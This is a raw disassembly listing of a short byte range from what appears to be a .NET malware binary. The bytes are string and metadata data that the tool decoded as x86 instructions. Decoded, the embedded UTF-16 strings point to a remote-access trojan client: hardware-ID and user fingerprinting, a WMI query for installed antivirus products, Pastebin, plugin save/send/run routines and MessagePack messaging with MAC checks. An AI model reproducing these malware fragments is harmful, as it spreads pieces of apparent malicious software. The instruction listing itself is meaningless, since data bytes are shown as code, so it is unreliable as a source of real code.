  40c3c9:	48                   	dec    %eax
  40c3ca:	00 57 00             	add    %dl,0x0(%edi)
  40c3cd:	49                   	dec    %ecx
  40c3ce:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c3d2:	09 55 00             	or     %edx,0x0(%ebp)
  40c3d5:	73 00                	jae    0x40c3d7
  40c3d7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c3db:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c3e1:	00 13                	add    %dl,(%ebx)
  40c3e3:	4d                   	dec    %ebp
  40c3e4:	00 69 00             	add    %ch,0x0(%ecx)
  40c3e7:	63 00                	arpl   %eax,(%eax)
  40c3e9:	72 00                	jb     0x40c3eb
  40c3eb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3ec:	00 73 00             	add    %dh,0x0(%ebx)
  40c3ef:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3f0:	00 66 00             	add    %ah,0x0(%esi)
  40c3f3:	74 00                	je     0x40c3f5
  40c3f5:	00 03                	add    %al,(%ebx)
  40c3f7:	20 00                	and    %al,(%eax)
  40c3f9:	00 09                	add    %cl,(%ecx)
  40c3fb:	54                   	push   %esp
  40c3fc:	00 72 00             	add    %dh,0x0(%edx)
  40c3ff:	75 00                	jne    0x40c401
  40c401:	65 00 00             	add    %al,%gs:(%eax)
  40c404:	0b 36                	or     (%esi),%esi
  40c406:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c409:	62 00                	bound  %eax,(%eax)
  40c40b:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c411:	46                   	inc    %esi
  40c412:	00 61 00             	add    %ah,0x0(%ecx)
  40c415:	6c                   	insb   (%dx),%es:(%edi)
  40c416:	00 73 00             	add    %dh,0x0(%ebx)
  40c419:	65 00 00             	add    %al,%gs:(%eax)
  40c41c:	0b 33                	or     (%ebx),%esi
  40c41e:	00 32                	add    %dh,(%edx)
  40c420:	00 62 00             	add    %ah,0x0(%edx)
  40c423:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c429:	50                   	push   %eax
  40c42a:	00 61 00             	add    %ah,0x0(%ecx)
  40c42d:	74 00                	je     0x40c42f
  40c42f:	68 00 00 0f 56       	push   $0x560f0000
  40c434:	00 65 00             	add    %ah,0x0(%ebp)
  40c437:	72 00                	jb     0x40c439
  40c439:	73 00                	jae    0x40c43b
  40c43b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40c441:	00 0b                	add    %cl,(%ebx)
  40c443:	41                   	inc    %ecx
  40c444:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40c448:	00 69 00             	add    %ch,0x0(%ecx)
  40c44b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c44c:	00 00                	add    %al,(%eax)
  40c44e:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40c452:	00 75 00             	add    %dh,0x0(%ebp)
  40c455:	65 00 00             	add    %al,%gs:(%eax)
  40c458:	0b 66 00             	or     0x0(%esi),%esp
  40c45b:	61                   	popa
  40c45c:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40c460:	00 65 00             	add    %ah,0x0(%ebp)
  40c463:	00 17                	add    %dl,(%edi)
  40c465:	50                   	push   %eax
  40c466:	00 65 00             	add    %ah,0x0(%ebp)
  40c469:	72 00                	jb     0x40c46b
  40c46b:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c46f:	72 00                	jb     0x40c471
  40c471:	6d                   	insl   (%dx),%es:(%edi)
  40c472:	00 61 00             	add    %ah,0x0(%ecx)
  40c475:	6e                   	outsb  %ds:(%esi),(%dx)
  40c476:	00 63 00             	add    %ah,0x0(%ebx)
  40c479:	65 00 00             	add    %al,%gs:(%eax)
  40c47c:	11 50 00             	adc    %edx,0x0(%eax)
  40c47f:	61                   	popa
  40c480:	00 73 00             	add    %dh,0x0(%ebx)
  40c483:	74 00                	je     0x40c485
  40c485:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40c489:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40c48f:	41                   	inc    %ecx
  40c490:	00 6e 00             	add    %ch,0x0(%esi)
  40c493:	74 00                	je     0x40c495
  40c495:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c49b:	72 00                	jb     0x40c49d
  40c49d:	75 00                	jne    0x40c49f
  40c49f:	73 00                	jae    0x40c4a1
  40c4a1:	00 13                	add    %dl,(%ebx)
  40c4a3:	49                   	dec    %ecx
  40c4a4:	00 6e 00             	add    %ch,0x0(%esi)
  40c4a7:	73 00                	jae    0x40c4a9
  40c4a9:	74 00                	je     0x40c4ab
  40c4ab:	61                   	popa
  40c4ac:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c4b0:	00 65 00             	add    %ah,0x0(%ebp)
  40c4b3:	64 00 00             	add    %al,%fs:(%eax)
  40c4b6:	09 50 00             	or     %edx,0x0(%eax)
  40c4b9:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4ba:	00 6e 00             	add    %ch,0x0(%esi)
  40c4bd:	67 00 00             	add    %al,(%bx,%si)
  40c4c0:	0b 47 00             	or     0x0(%edi),%eax
  40c4c3:	72 00                	jb     0x40c4c5
  40c4c5:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4c6:	00 75 00             	add    %dh,0x0(%ebp)
  40c4c9:	70 00                	jo     0x40c4cb
  40c4cb:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40c4d1:	00 2b                	add    %ch,(%ebx)
  40c4d3:	5c                   	pop    %esp
  40c4d4:	00 72 00             	add    %dh,0x0(%edx)
  40c4d7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c4d8:	00 6f 00             	add    %ch,0x0(%edi)
  40c4db:	74 00                	je     0x40c4dd
  40c4dd:	5c                   	pop    %esp
  40c4de:	00 53 00             	add    %dl,0x0(%ebx)
  40c4e1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c4e5:	75 00                	jne    0x40c4e7
  40c4e7:	72 00                	jb     0x40c4e9
  40c4e9:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40c4ef:	43                   	inc    %ebx
  40c4f0:	00 65 00             	add    %ah,0x0(%ebp)
  40c4f3:	6e                   	outsb  %ds:(%esi),(%dx)
  40c4f4:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40c4f8:	00 72 00             	add    %dh,0x0(%edx)
  40c4fb:	32 00                	xor    (%eax),%al
  40c4fd:	00 3d 53 00 65 00    	add    %bh,0x650053
  40c503:	6c                   	insb   (%dx),%es:(%edi)
  40c504:	00 65 00             	add    %ah,0x0(%ebp)
  40c507:	63 00                	arpl   %eax,(%eax)
  40c509:	74 00                	je     0x40c50b
  40c50b:	20 00                	and    %al,(%eax)
  40c50d:	2a 00                	sub    (%eax),%al
  40c50f:	20 00                	and    %al,(%eax)
  40c511:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c515:	6f                   	outsl  %ds:(%esi),(%dx)
  40c516:	00 6d 00             	add    %ch,0x0(%ebp)
  40c519:	20 00                	and    %al,(%eax)
  40c51b:	41                   	inc    %ecx
  40c51c:	00 6e 00             	add    %ch,0x0(%esi)
  40c51f:	74 00                	je     0x40c521
  40c521:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40c527:	72 00                	jb     0x40c529
  40c529:	75 00                	jne    0x40c52b
  40c52b:	73 00                	jae    0x40c52d
  40c52d:	50                   	push   %eax
  40c52e:	00 72 00             	add    %dh,0x0(%edx)
  40c531:	6f                   	outsl  %ds:(%esi),(%dx)
  40c532:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40c536:	00 63 00             	add    %ah,0x0(%ebx)
  40c539:	74 00                	je     0x40c53b
  40c53b:	00 17                	add    %dl,(%edi)
  40c53d:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40c541:	73 00                	jae    0x40c543
  40c543:	70 00                	jo     0x40c545
  40c545:	6c                   	insb   (%dx),%es:(%edi)
  40c546:	00 61 00             	add    %ah,0x0(%ecx)
  40c549:	79 00                	jns    0x40c54b
  40c54b:	4e                   	dec    %esi
  40c54c:	00 61 00             	add    %ah,0x0(%ecx)
  40c54f:	6d                   	insl   (%dx),%es:(%edi)
  40c550:	00 65 00             	add    %ah,0x0(%ebp)
  40c553:	00 07                	add    %al,(%edi)
  40c555:	4e                   	dec    %esi
  40c556:	00 2f                	add    %ch,(%edi)
  40c558:	00 41 00             	add    %al,0x0(%ecx)
  40c55b:	00 05 2c 00 20 00    	add    %al,0x20002c
  40c561:	00 13                	add    %dl,(%ebx)
  40c563:	53                   	push   %ebx
  40c564:	00 6f 00             	add    %ch,0x0(%edi)
  40c567:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40c56c:	00 61 00             	add    %ah,0x0(%ecx)
  40c56f:	72 00                	jb     0x40c571
  40c571:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40c576:	09 70 00             	or     %esi,0x0(%eax)
  40c579:	6f                   	outsl  %ds:(%esi),(%dx)
  40c57a:	00 6e 00             	add    %ch,0x0(%esi)
  40c57d:	67 00 00             	add    %al,(%bx,%si)
  40c580:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40c585:	75 00                	jne    0x40c587
  40c587:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c58b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c58c:	00 00                	add    %al,(%eax)
  40c58e:	15 73 00 61 00       	adc    $0x610073,%eax
  40c593:	76 00                	jbe    0x40c595
  40c595:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40c599:	6c                   	insb   (%dx),%es:(%edi)
  40c59a:	00 75 00             	add    %dh,0x0(%ebp)
  40c59d:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40c5a1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5a2:	00 00                	add    %al,(%eax)
  40c5a4:	07                   	pop    %es
  40c5a5:	44                   	inc    %esp
  40c5a6:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40c5aa:	00 00                	add    %al,(%eax)
  40c5ac:	15 73 00 65 00       	adc    $0x650073,%eax
  40c5b1:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5b2:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40c5b6:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5ba:	00 67 00             	add    %ah,0x0(%edi)
  40c5bd:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40c5c3:	48                   	dec    %eax
  40c5c4:	00 61 00             	add    %ah,0x0(%ecx)
  40c5c7:	73 00                	jae    0x40c5c9
  40c5c9:	68 00 65 00 73       	push   $0x73006500
  40c5ce:	00 00                	add    %al,(%eax)
  40c5d0:	09 48 00             	or     %ecx,0x0(%eax)
  40c5d3:	61                   	popa
  40c5d4:	00 73 00             	add    %dh,0x0(%ebx)
  40c5d7:	68 00 00 1b 50       	push   $0x501b0000
  40c5dc:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5e0:	00 67 00             	add    %ah,0x0(%edi)
  40c5e3:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40c5e9:	50                   	push   %eax
  40c5ea:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40c5ee:	00 67 00             	add    %ah,0x0(%edi)
  40c5f1:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40c5f7:	52                   	push   %edx
  40c5f8:	00 75 00             	add    %dh,0x0(%ebp)
  40c5fb:	6e                   	outsb  %ds:(%esi),(%dx)
  40c5fc:	00 00                	add    %al,(%eax)
  40c5fe:	0f 4d 00             	cmovge (%eax),%eax
  40c601:	73 00                	jae    0x40c603
  40c603:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40c607:	61                   	popa
  40c608:	00 63 00             	add    %ah,0x0(%ebx)
  40c60b:	6b 00 00             	imul   $0x0,(%eax),%eax
  40c60e:	11 52 00             	adc    %edx,0x0(%edx)
  40c611:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c615:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40c619:	76 00                	jbe    0x40c61b
  40c61b:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40c620:	0b 45 00             	or     0x0(%ebp),%eax
  40c623:	72 00                	jb     0x40c625
  40c625:	72 00                	jb     0x40c627
  40c627:	6f                   	outsl  %ds:(%esi),(%dx)
  40c628:	00 72 00             	add    %dh,0x0(%edx)
  40c62b:	00 47 6d             	add    %al,0x6d(%edi)
  40c62e:	00 61 00             	add    %ah,0x0(%ecx)
  40c631:	73 00                	jae    0x40c633
  40c633:	74 00                	je     0x40c635
  40c635:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c639:	4b                   	dec    %ebx
  40c63a:	00 65 00             	add    %ah,0x0(%ebp)
  40c63d:	79 00                	jns    0x40c63f
  40c63f:	20 00                	and    %al,(%eax)
  40c641:	63 00                	arpl   %eax,(%eax)
  40c643:	61                   	popa
  40c644:	00 6e 00             	add    %ch,0x0(%esi)
  40c647:	20 00                	and    %al,(%eax)
  40c649:	6e                   	outsb  %ds:(%esi),(%dx)
  40c64a:	00 6f 00             	add    %ch,0x0(%edi)
  40c64d:	74 00                	je     0x40c64f
  40c64f:	20 00                	and    %al,(%eax)
  40c651:	62 00                	bound  %eax,(%eax)
  40c653:	65 00 20             	add    %ah,%gs:(%eax)
  40c656:	00 6e 00             	add    %ch,0x0(%esi)
  40c659:	75 00                	jne    0x40c65b
  40c65b:	6c                   	insb   (%dx),%es:(%edi)
  40c65c:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40c660:	00 6f 00             	add    %ch,0x0(%edi)
  40c663:	72 00                	jb     0x40c665
  40c665:	20 00                	and    %al,(%eax)
  40c667:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c66b:	70 00                	jo     0x40c66d
  40c66d:	74 00                	je     0x40c66f
  40c66f:	79 00                	jns    0x40c671
  40c671:	2e 00 00             	add    %al,%cs:(%eax)
  40c674:	2d 69 00 6e 00       	sub    $0x6e0069,%eax
  40c679:	70 00                	jo     0x40c67b
  40c67b:	75 00                	jne    0x40c67d
  40c67d:	74 00                	je     0x40c67f
  40c67f:	20 00                	and    %al,(%eax)
  40c681:	63 00                	arpl   %eax,(%eax)
  40c683:	61                   	popa
  40c684:	00 6e 00             	add    %ch,0x0(%esi)
  40c687:	20 00                	and    %al,(%eax)
  40c689:	6e                   	outsb  %ds:(%esi),(%dx)
  40c68a:	00 6f 00             	add    %ch,0x0(%edi)
  40c68d:	74 00                	je     0x40c68f
  40c68f:	20 00                	and    %al,(%eax)
  40c691:	62 00                	bound  %eax,(%eax)
  40c693:	65 00 20             	add    %ah,%gs:(%eax)
  40c696:	00 6e 00             	add    %ch,0x0(%esi)
  40c699:	75 00                	jne    0x40c69b
  40c69b:	6c                   	insb   (%dx),%es:(%edi)
  40c69c:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c6a0:	00 00                	add    %al,(%eax)
  40c6a2:	55                   	push   %ebp
  40c6a3:	49                   	dec    %ecx
  40c6a4:	00 6e 00             	add    %ch,0x0(%esi)
  40c6a7:	76 00                	jbe    0x40c6a9
  40c6a9:	61                   	popa
  40c6aa:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40c6ae:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40c6b2:	00 6d 00             	add    %ch,0x0(%ebp)
  40c6b5:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c6b9:	73 00                	jae    0x40c6bb
  40c6bb:	61                   	popa
  40c6bc:	00 67 00             	add    %ah,0x0(%edi)
  40c6bf:	65 00 20             	add    %ah,%gs:(%eax)
  40c6c2:	00 61 00             	add    %ah,0x0(%ecx)
  40c6c5:	75 00                	jne    0x40c6c7
  40c6c7:	74 00                	je     0x40c6c9
  40c6c9:	68 00 65 00 6e       	push   $0x6e006500
  40c6ce:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6d2:	00 63 00             	add    %ah,0x0(%ebx)
  40c6d5:	61                   	popa
  40c6d6:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c6da:	00 6f 00             	add    %ch,0x0(%edi)
  40c6dd:	6e                   	outsb  %ds:(%esi),(%dx)
  40c6de:	00 20                	add    %ah,(%eax)
  40c6e0:	00 63 00             	add    %ah,0x0(%ebx)
  40c6e3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c6e4:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c6e8:	00 20                	add    %ah,(%eax)
  40c6ea:	00 28                	add    %ch,(%eax)
  40c6ec:	00 4d 00             	add    %cl,0x0(%ebp)
  40c6ef:	41                   	inc    %ecx
  40c6f0:	00 43 00             	add    %al,0x0(%ebx)
  40c6f3:	29 00                	sub    %eax,(%eax)
  40c6f5:	2e 00 00             	add    %al,%cs:(%eax)
  40c6f8:	05 58 00 32 00       	add    $0x320058,%eax
  40c6fd:	00 0f                	add    %cl,(%edi)
  40c6ff:	7b 00                	jnp    0x40c701
  40c701:	30 00                	xor    %al,(%eax)
  40c703:	3a 00                	cmp    (%eax),%al
  40c705:	44                   	inc    %esp
  40c706:	00 33                	add    %dh,(%ebx)
  40c708:	00 7d 00             	add    %bh,0x0(%ebp)
  40c70b:	20 00                	and    %al,(%eax)
  40c70d:	00 0f                	add    %cl,(%edi)
  40c70f:	7b 00                	jnp    0x40c711
  40c711:	30 00                	xor    %al,(%eax)
  40c713:	3a 00                	cmp    (%eax),%al
  40c715:	58                   	pop    %eax
  40c716:	00 32                	add    %dh,(%edx)
  40c718:	00 7d 00             	add    %bh,0x0(%ebp)
  40c71b:	20 00                	and    %al,(%eax)
  40c71d:	00 2b                	add    %ch,(%ebx)
  40c71f:	28 00                	sub    %al,(%eax)
  40c721:	6e                   	outsb  %ds:(%esi),(%dx)
  40c722:	00 65 00             	add    %ah,0x0(%ebp)
  40c725:	76 00                	jbe    0x40c727
  40c727:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c72b:	20 00                	and    %al,(%eax)
  40c72d:	75 00                	jne    0x40c72f
  40c72f:	73 00                	jae    0x40c731
  40c731:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40c736:	00 20                	add    %ah,(%eax)
  40c738:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40c73c:	00 70 00             	add    %dh,0x0(%eax)
  40c73f:	65 00 20             	add    %ah,%gs:(%eax)
  40c742:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c745:	63 00                	arpl   %eax,(%eax)
  40c747:	31 00                	xor    %eax,(%eax)
  40c749:	00 45 28             	add    %al,0x28(%ebp)
  40c74c:	00 65 00             	add    %ah,0x0(%ebp)
  40c74f:	78 00                	js     0x40c751
  40c751:	74 00                	je     0x40c753
  40c753:	38 00                	cmp    %al,(%eax)
  40c755:	2c 00                	sub    $0x0,%al
  40c757:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c75b:	74 00                	je     0x40c75d
  40c75d:	31 00                	xor    %eax,(%eax)
  40c75f:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40c763:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40c767:	33 00                	xor    (%eax),%eax
  40c769:	32 00                	xor    (%eax),%al
  40c76b:	29 00                	sub    %eax,(%eax)
  40c76d:	20 00                	and    %al,(%eax)
  40c76f:	74 00                	je     0x40c771
  40c771:	79 00                	jns    0x40c773
  40c773:	70 00                	jo     0x40c775
  40c775:	65 00 20             	add    %ah,%gs:(%eax)
  40c778:	00 24 00             	add    %ah,(%eax,%eax,1)
  40c77b:	63 00                	arpl   %eax,(%eax)
  40c77d:	37                   	aaa
  40c77e:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40c781:	24 00                	and    $0x0,%al
  40c783:	63 00                	arpl   %eax,(%eax)
  40c785:	38 00                	cmp    %al,(%eax)
  40c787:	2c 00                	sub    $0x0,%al
  40c789:	24 00                	and    $0x0,%al
  40c78b:	63 00                	arpl   %eax,(%eax)
  40c78d:	39 00                	cmp    %eax,(%eax)
  40c78f:	00 14 74             	add    %dl,(%esp,%esi,2)
  40c792:	6b 73 7b 88          	imul   $0xffffff88,0x7b(%ebx),%esi
  40c796:	11 4e 8d             	adc    %ecx,-0x73(%esi)
  40c799:	24 f5                	and    $0xf5,%al
  40c79b:	ac                   	lods   %ds:(%esi),%al
  40c79c:	9a d7 a1 0a 00 08 b7 	lcall  $0xb708,$0xaa1d7
  40c7a3:	7a 5c                	jp     0x40c801
  40c7a5:	56                   	push   %esi
  40c7a6:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40c7a9:	89 03                	mov    %eax,(%ebx)
  40c7ab:	00 00                	add    %al,(%eax)
  40c7ad:	01 03                	add    %eax,(%ebx)
  40c7af:	20 00                	and    %al,(%eax)
  40c7b1:	01 02                	add    %eax,(%edx)
  40c7b3:	06                   	push   %es
  40c7b4:	0e                   	push   %cs
  40c7b5:	03 06                	add    (%esi),%eax
  40c7b7:	12 09                	adc    (%ecx),%cl
  40c7b9:	03 06                	add    (%esi),%eax
  40c7bb:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40c7bf:	00 02                	add    %al,(%edx)
  40c7c1:	03 06                	add    (%esi),%eax
  40c7c3:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40c7c9:	03 06                	add    (%esi),%eax
  40c7cb:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40c7d0:	03 06                	add    (%esi),%eax
  40c7d2:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40c7d8:	06                   	push   %es
  40c7d9:	1c 02                	sbb    $0x2,%al
  40c7db:	06                   	push   %es
  40c7dc:	08 04 00             	or     %al,(%eax,%eax,1)
  40c7df:	00 12                	add    %dl,(%edx)
  40c7e1:	0d 05 00 01 01       	or     $0x1010005,%eax
  40c7e6:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40c7ec:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40c7f2:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40c7f5:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40c7fb:	01 1d 05 03 00 00    	add    %ebx,0x305
  40c801:	0a 04 00             	or     (%eax,%eax,1),%al
  40c804:	01 01                	add    %eax,(%ecx)
  40c806:	0a 04 00             	or     (%eax,%eax,1),%al
  40c809:	00 12                	add    %dl,(%edx)
  40c80b:	15 05 00 01 01       	adc    $0x1010005,%eax
  40c810:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40c816:	02 03                	add    (%ebx),%al
  40c818:	00 00                	add    %al,(%eax)
  40c81a:	1c 03                	sbb    $0x3,%al
  40c81c:	00 00                	add    %al,(%eax)
  40c81e:	08 04 00             	or     %al,(%eax,%eax,1)
  40c821:	01 01                	add    %eax,(%ecx)
  40c823:	08 04 00             	or     %al,(%eax,%eax,1)
  40c826:	01 02                	add    %eax,(%edx)
  40c828:	0e                   	push   %cs
  40c829:	0a 00                	or     (%eax),%al
  40c82b:	04 02                	add    $0x2,%al
  40c82d:	1c 12                	sbb    $0x12,%al
  40c82f:	19 12                	sbb    %edx,(%edx)
  40c831:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40c836:	01 01                	add    %eax,(%ecx)
  40c838:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40c83e:	1c 04                	sbb    $0x4,%al
  40c840:	08 00                	or     %al,(%eax)
  40c842:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40c848:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40c84b:	00 1d 05 03 08 00    	add    %bl,0x80305
  40c851:	0a 04 08             	or     (%eax,%ecx,1),%al
  40c854:	00 12                	add    %dl,(%edx)
  40c856:	15 03 08 00 02       	adc    $0x2000803,%eax
  40c85b:	03 08                	add    (%eax),%ecx
  40c85d:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c860:	08 00                	or     %al,(%eax)
  40c862:	08 03                	or     %al,(%ebx)
  40c864:	00 00                	add    %al,(%eax)
  40c866:	0e                   	push   %cs
  40c867:	04 00                	add    $0x0,%al
  40c869:	01 0e                	add    %ecx,(%esi)
  40c86b:	0e                   	push   %cs
  40c86c:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40c872:	d5 0a                	aad    $0xa
  40c874:	3a 06                	cmp    (%esi),%al
  40c876:	00 01                	add    %al,(%ecx)
  40c878:	12 29                	adc    (%ecx),%ch
  40c87a:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40c880:	03 00                	add    (%eax),%eax
  40c882:	00 18                	add    %bl,(%eax)
  40c884:	07                   	pop    %es
  40c885:	00 03                	add    %al,(%ebx)
  40c887:	08 18                	or     %bl,(%eax)
  40c889:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40c88f:	18 0e                	sbb    %cl,(%esi)
  40c891:	06                   	push   %es
  40c892:	00 02                	add    %al,(%edx)
  40c894:	02 18                	add    (%eax),%bl
  40c896:	10 02                	adc    %al,(%edx)
  40c898:	06                   	push   %es
  40c899:	00 01                	add    %al,(%ecx)
  40c89b:	11 30                	adc    %esi,(%eax)
  40c89d:	11 30                	adc    %esi,(%eax)
  40c89f:	06                   	push   %es
  40c8a0:	00 03                	add    %al,(%ebx)
  40c8a2:	01 09                	add    %ecx,(%ecx)
  40c8a4:	09 09                	or     %ecx,(%ecx)
  40c8a6:	02 06                	add    (%esi),%al
  40c8a8:	09 03                	or     %eax,(%ebx)
  40c8aa:	06                   	push   %es
  40c8ab:	11 30                	adc    %esi,(%eax)
  40c8ad:	04 00                	add    $0x0,%al
  40c8af:	00 00                	add    %al,(%eax)
  40c8b1:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40c8b5:	00 00                	add    %al,(%eax)
  40c8b7:	04 01                	add    $0x1,%al
  40c8b9:	00 00                	add    %al,(%eax)
  40c8bb:	00 06                	add    %al,(%esi)
  40c8bd:	00 02                	add    %al,(%edx)
  40c8bf:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c8c2:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40c8c7:	0e                   	push   %cs
  40c8c8:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c8cd:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40c8d2:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c8d7:	60                   	pusha
  40c8d8:	05 00 01 01 12       	add    $0x12010100,%eax
  40c8dd:	60                   	pusha
  40c8de:	04 00                	add    $0x0,%al
  40c8e0:	01 01                	add    %eax,(%ecx)
  40c8e2:	0e                   	push   %cs
  40c8e3:	18 06                	sbb    %al,(%esi)
  40c8e5:	15 12 45 01 15       	adc    $0x15014512,%eax
  40c8ea:	12 49 0a             	adc    0xa(%ecx),%cl
  40c8ed:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40c8f0:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40c8f6:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c8fb:	0e                   	push   %cs
  40c8fc:	04 20                	add    $0x20,%al
  40c8fe:	00 00                	add    %al,(%eax)
  40c900:	00 04 40             	add    %al,(%eax,%eax,2)
  40c903:	00 00                	add    %al,(%eax)
  40c905:	00 04 10             	add    %al,(%eax,%edx,1)
  40c908:	00 00                	add    %al,(%eax)
  40c90a:	00 04 20             	add    %al,(%eax,%eiz,1)
  40c90d:	01 01                	add    %eax,(%ecx)
  40c90f:	0e                   	push   %cs
  40c910:	04 20                	add    $0x20,%al
  40c912:	01 0e                	add    %ecx,(%esi)
  40c914:	0e                   	push   %cs
  40c915:	06                   	push   %es
  40c916:	20 01                	and    %al,(%ecx)
  40c918:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40c91d:	20 02                	and    %al,(%edx)
  40c91f:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40c925:	00 01                	add    %al,(%ecx)
  40c927:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40c92c:	06                   	push   %es
  40c92d:	11 50 03             	adc    %edx,0x3(%eax)
  40c930:	06                   	push   %es
  40c931:	12 55 05             	adc    0x5(%ebp),%dl
  40c934:	00 01                	add    %al,(%ecx)
  40c936:	0e                   	push   %cs
  40c937:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40c93c:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40c941:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40c947:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40c94d:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40c953:	01 01                	add    %eax,(%ecx)
  40c955:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c95a:	60                   	pusha
  40c95b:	03 20                	add    (%eax),%esp
  40c95d:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40c960:	20 00                	and    %al,(%eax)
  40c962:	02 03                	add    (%ebx),%al
  40c964:	28 00                	sub    %al,(%eax)
  40c966:	1c 03                	sbb    $0x3,%al
  40c968:	06                   	push   %es
  40c969:	12 60 0b             	adc    0xb(%eax),%ah
  40c96c:	20 02                	and    %al,(%edx)
  40c96e:	01 12                	add    %edx,(%edx)
  40c970:	60                   	pusha
  40c971:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c976:	60                   	pusha
  40c977:	04 20                	add    $0x20,%al
  40c979:	00 12                	add    %dl,(%edx)
